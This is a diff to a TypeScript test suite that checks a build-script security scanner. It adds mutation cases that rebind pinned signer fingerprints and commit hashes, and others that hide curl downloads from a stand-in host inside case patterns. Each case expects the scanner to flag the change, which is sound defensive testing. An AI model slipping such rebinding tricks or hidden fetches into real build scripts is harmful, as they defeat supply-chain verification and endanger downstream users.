@@ -168,6 +168,8 @@ describe('build.sh scan: allowlisted commands; every fetch pinned or explicitly 
     return src.replace(from, () => to); // a function: `$'` in `to` is not a replace pattern
   };
   const add = (line: string) => sub('lap sysroots', `${line}\nlap sysroots`);
+  const FPR_LINE = `fpr="$(awk -F: '/^fpr:/ && !n++ {print $10}' /tmp/llvm.colons)"`;
+  const HEADSHORT_LINE = `headshort="$(printf '%s' "$HEAD_SHA" | cut -c1-9)"`;
   const EVIL = 'curl -fsSL https://e.invalid/wk.tgz -o "/tmp/wk/$wkfile"';
   // In-suite mutation proofs: each is a weakening an earlier guard let through. The expected problem
   // is asserted, so a row cannot pass for an incidental reason.
@@ -631,6 +633,110 @@ describe('build.sh scan: allowlisted commands; every fetch pinned or explicitly 
       /\$'…' quoting .* is banned/,
     ],
     ['rule 12: $"…" locale quoting', () => add('echo $"x"'), /\$"…" quoting .* is banned/],
+    // round 11 (review-1469-r10, HIGH-1): the verifiers were matched by their TEXT while their
+    // OPERANDS could be rebound — the check then ran exactly as reviewed, on values it no longer
+    // controlled. Every name now has one binding site (found by scanning every Assign, loop header
+    // and argument-binding command) and the operands have one reviewed derivation each.
+    [
+      'D1b: UPSTREAM_SHA rebound before the fetch and restored after the check',
+      () =>
+        sub(
+          'git fetch -q --depth 1 origin "$UPSTREAM_SHA"\ngit checkout -q FETCH_HEAD\ntest "$(git rev-parse HEAD)" = "$UPSTREAM_SHA"\n',
+          'UPSTREAM_SHA="$(cat "$WS/.prefix")"\ngit fetch -q --depth 1 origin "$UPSTREAM_SHA"\ngit checkout -q FETCH_HEAD\ntest "$(git rev-parse HEAD)" = "$UPSTREAM_SHA"\nUPSTREAM_SHA="${PREFIX%%-*}"\n',
+        ),
+      /UPSTREAM_SHA has 3 assignment sites/,
+    ],
+    [
+      'D1b: … and the rebinding line is not the reviewed derivation',
+      () =>
+        sub(
+          'git fetch -q --depth 1 origin "$UPSTREAM_SHA"\n',
+          'UPSTREAM_SHA="$(cat "$WS/.prefix")"\ngit fetch -q --depth 1 origin "$UPSTREAM_SHA"\n',
+        ),
+      /UPSTREAM_SHA may only be set as/,
+    ],
+    [
+      'D2: fpr bound to the pin itself (the fingerprint check compares the pin with itself)',
+      () => sub(FPR_LINE, 'fpr="${LLVM_SIGNER_FPR// /}"'),
+      /fpr may only be set as/,
+    ],
+    [
+      'D3: LLVM_SIGNER_FPR rebound to the downloaded key fingerprint',
+      () => sub(`${FPR_LINE}\n`, `${FPR_LINE}\nLLVM_SIGNER_FPR="$fpr"\n`),
+      /LLVM_SIGNER_FPR has 2 assignment sites/,
+    ],
+    [
+      'D3 (single site): the signer pin computed instead of committed',
+      () =>
+        sub(/^LLVM_SIGNER_FPR=.*$/m.exec(real)![0], 'LLVM_SIGNER_FPR="$(cat /tmp/llvm.colons)"'),
+      /pin LLVM_SIGNER_FPR must be static text/,
+    ],
+    ['D4: headshort emptied', () => sub(HEADSHORT_LINE, 'headshort=""'), /headshort may only/],
+    [
+      'D5: wkkey rebound before the cp',
+      () => sub('  cp "/tmp/wk/$wkfile"', '  wkkey=x\n  cp "/tmp/wk/$wkfile"'),
+      /wkkey has 2 assignment sites/,
+    ],
+    // each binder kind is a site (scanned, not listed per name)
+    ...(
+      [
+        ['read', 'read -r fpr <<<"x"'],
+        ['read -a', 'read -ra fpr <<<"x"'],
+        ['read -d "" (valued option skipped)', 'read -d "" -r fpr <<<"x"'],
+        ['printf -v', "printf -v fpr '%s' x"],
+        ['printf -vNAME', "printf -vfpr '%s' x"],
+        ['mapfile', 'mapfile -t fpr </tmp/llvm.asc'],
+        ['readarray', 'readarray fpr </tmp/llvm.asc'],
+        ['getopts', 'getopts ab fpr'],
+        ['wait -p', 'wait -n -p fpr'],
+        ['a for loop variable', 'for fpr in x; do echo; done'],
+        ['export NAME=', 'export fpr=x'],
+        ['local NAME', 'local fpr'],
+        ['a prefix assignment', 'fpr=x echo y'],
+        ['a subshell assignment', '( fpr=x )'],
+        ['an assignment in a $( )', 'echo "$(fpr=x)"'],
+      ] as const
+    ).map(
+      ([n, line]) =>
+        [`single site: ${n} rebinding fpr`, () => add(line), /fpr has 2 assignment sites/] as [
+          string,
+          () => string,
+          RegExp,
+        ],
+    ),
+    [
+      'single site: a binder with a non-static name',
+      () => add('read -r "$wk" <<<"x"'),
+      /read binds a name that is not a static identifier/,
+    ],
+    [
+      'single site: the manifest loop reusing the patch-lint loop variable',
+      () => sub('for pf in "$WS"/patches/*.patch; do', 'for p in "$WS"/patches/*.patch; do'),
+      /\bp has 2 assignment sites/,
+    ],
+    [
+      'exception list: a THIRD have_patches site',
+      () => add('have_patches=yes'),
+      /have_patches has 3 assignment sites/,
+    ],
+    [
+      'exception list: a changed wkarch site',
+      () => sub('wkarch=arm64', 'wkarch=amd64'),
+      /wkarch has 2 assignment sites/,
+    ],
+    // round 11 (review-1469-r10, L2): the rule walk's case-pattern and case-word descents had no
+    // row, so dropping either stayed green. A fetch in each is a subst-context network command,
+    // which only the RULE walk reports.
+    [
+      'L2: $( ) with a curl in a case PATTERN',
+      () => add('case x in "$(curl -fsSL https://e.invalid/cp -o /tmp/cp)") echo y ;; esac'),
+      /network command outside the script's top-level flow \(subst\)/,
+    ],
+    [
+      'L2: $( ) with a curl in a case WORD',
+      () => add('case "$(curl -fsSL https://e.invalid/cw -o /tmp/cw)" in x) echo y ;; esac'),
+      /network command outside the script's top-level flow \(subst\)/,
+    ],
   ])('goes RED on: %s', (_n, mutate, why) => {
     const v = scan(mutate());
     expect(v.join('\n')).toMatch(why);
@@ -646,6 +752,11 @@ describe('build.sh scan: allowlisted commands; every fetch pinned or explicitly 
       'an unpinned curl in prefix.sh',
       (s) => `${s}\ncurl -fsSL https://e.invalid/a -o /tmp/q`,
       /prefix\.sh may not run a network command/,
+    ],
+    [
+      'the upstream sha rebound after its format check (single-site rule)',
+      (s) => s.replace('cd "$here/patches"', () => 'sha=0000\ncd "$here/patches"'),
+      /sha has 2 assignment sites/,
     ],
   ])('prefix.sh goes RED on: %s', (_n, mutate, why) => {
     expect(scanPrefix(mutate(prefix)).join('\n')).toMatch(why);
